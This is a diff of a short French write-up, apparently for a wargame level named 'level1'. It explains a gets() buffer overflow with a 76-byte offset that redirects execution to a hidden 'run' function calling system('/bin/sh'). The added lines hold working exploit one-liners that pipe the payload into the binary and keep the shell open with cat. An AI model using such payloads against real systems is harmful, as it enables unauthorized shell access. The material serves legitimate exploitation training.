@@ -2,17 +2,20 @@ Lorsqu'on fait un disas main, on voit la fonction gets qui est utilise.
 De plus en decompilant le programe, on peut voir un offset de 76
 gets est susceptible au buffer overflow.
 
-En faisant un info functions, on peut trouver une fonction inutilise run avec un system(/bin/sh)
+En faisant un info functions, on peut trouver une fonction inutilise `run` située en 0x08048444 avec un appel à `system` et un argument `/bin/sh`.
 
 On decide donc de creer un buffer avec un offset de 76 et de le decaler a run ce qui permet de lancer la fonction run
-Il faut rajouter un cat pour permettre au sh de se maintenir.
 
-In x86 and x86_64 architectures, the byte order is little-endian. The address 0x08048444 would be represented as '\x44\x84\x04\x08' in little-endian.
+Sur le type d'architecture de la machine, les bytes sont en little-endian, donc 0x08048444 sera représenté par '\x44\x84\x04\x08'.
 
-
+```bash
 chmod +w .
-python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > buffer
-(cat buffer; cat) | ./level1```
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
+```
 
+Le problème est que le terminal est kill instantanément, nous pouvons donc ajouter un cat qui maintiendra ouvert l'entrée standard.
 
-(WORK IN PROGRESS)
+```bash
+chmod +w .
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
